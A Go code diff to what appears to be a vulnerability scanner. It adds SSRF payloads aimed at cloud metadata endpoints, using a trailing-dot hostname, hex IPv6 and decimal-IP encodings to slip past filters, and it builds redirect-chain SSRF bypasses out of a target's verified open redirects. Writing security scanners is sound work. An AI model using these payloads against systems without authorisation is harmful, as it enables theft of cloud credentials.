@@ -5,6 +5,7 @@ import (
 	"fmt"
 	"io"
 	"net/http"
+	"net/url"
 	"regexp"
 	"strings"
 	"sync"
@@ -80,10 +81,12 @@ var ssrfPayloadHostMarkers = []string{
 	"169.254.169.254",
 	"2852039166",
 	"::ffff:169.254",
+	"::ffff:a9fe:a9fe",
 	"0251.0376.0251.0376",
 	"0xa9fea9fe",
 	"metadata.google.internal",
 	"100.100.100.200",
+	"1684301000",
 }
 
 // responseReflectsPayload reports whether the response merely echoed our SSRF
@@ -118,6 +121,64 @@ var ssrfInbandPayloads = []struct{ url, note string }{
 	{"http://100.100.100.200/latest/meta-data/", "Alibaba Cloud metadata"},
 	{"http://169.254.169.254/metadata/v1/", "DigitalOcean metadata"},
 	{"http://169.254.169.254/opc/v2/instance/", "Oracle Cloud metadata"},
+	// Trailing-dot FQDN — a hostname allowlist anchored with a bare `$` on the
+	// exact string "metadata.google.internal" does not match this, while DNS
+	// resolves it identically (a trailing dot is the formal root-zone
+	// terminator and every resolver strips it before lookup).
+	{"http://metadata.google.internal./computeMetadata/v1/instance/service-accounts/default/?recursive=true", "GCP metadata (trailing-dot FQDN)"},
+	// Same IMDS address as the bracket-decimal IPv4-mapped-IPv6 entry above, in
+	// its alternate hex-group textual form — a different string for a URL
+	// parser or allowlist regex to fail to normalize before the socket layer
+	// resolves both to the identical address.
+	{"http://[::ffff:a9fe:a9fe]/latest/meta-data/", "AWS IMDS (IPv4-mapped IPv6, hex form)"},
+	{"http://1684301000/latest/meta-data/", "Alibaba Cloud metadata (decimal IP)"},
+}
+
+// redirectChainMetaTargets is the small set of metadata URLs tried through
+// each confirmed open redirect below — kept short deliberately: this is
+// combinatorial (every open redirect × every entry), and the point is
+// closing the "does this app's SSRF filter validate only the FIRST hostname"
+// gap, not maximizing metadata-path coverage (the direct payloads above
+// already do that).
+var redirectChainMetaTargets = []struct{ url, note string }{
+	{"http://169.254.169.254/latest/meta-data/", "AWS/Azure/GCP IMDS via redirect chain"},
+	{"http://2852039166/latest/meta-data/", "AWS IMDS (decimal IP) via redirect chain"},
+}
+
+// redirectChainPayloads turns each of the target's own CONFIRMED (verified)
+// external open redirects into an SSRF payload that points at cloud metadata:
+// the initial URL sits on the target's own trusted domain — so an SSRF
+// allowlist that validates only the FIRST hostname in the URL passes it —
+// and the target's own redirect then sends the server-side fetch on to the
+// metadata IP. This is the classic redirect-chain SSRF bypass, and it is
+// deliberately built ONLY from redirects Reconner has already verified land
+// off-origin (open_redirect_findings.verified=1); it never invents or probes
+// an arbitrary internal address on its own.
+func (s *SSRFScanner) redirectChainPayloads(ctx context.Context, targetID string) []struct{ url, note string } {
+	rows, err := s.db.QueryContext(ctx, `
+		SELECT url, parameter FROM open_redirect_findings WHERE target_id = ? AND verified = 1 LIMIT 10`, targetID)
+	if err != nil {
+		return nil
+	}
+	defer rows.Close()
+	var out []struct{ url, note string }
+	for rows.Next() {
+		var rawURL, param string
+		if rows.Scan(&rawURL, &param) != nil || param == "" {
+			continue
+		}
+		u, err := url.Parse(rawURL)
+		if err != nil {
+			continue
+		}
+		q := u.Query()
+		for _, mt := range redirectChainMetaTargets {
+			q.Set(param, mt.url)
+			u.RawQuery = q.Encode()
+			out = append(out, struct{ url, note string }{u.String(), mt.note})
+		}
+	}
+	return out
 }
 
 // Run tests SSRF-prone parameters by pointing them at cloud-metadata endpoints
@@ -143,6 +204,12 @@ func (s *SSRFScanner) Run(ctx context.Context, targetID string, logFn LogFunc) e
 		if !seenPayload[payload] {
 			seenPayload[payload] = true
 			payloads = append(payloads, struct{ url, note string }{payload, "operator corpus"})
+		}
+	}
+	for _, payload := range s.redirectChainPayloads(ctx, targetID) {
+		if !seenPayload[payload.url] {
+			seenPayload[payload.url] = true
+			payloads = append(payloads, payload)
 		}
 	}
 	if len(candidates) == 0 {
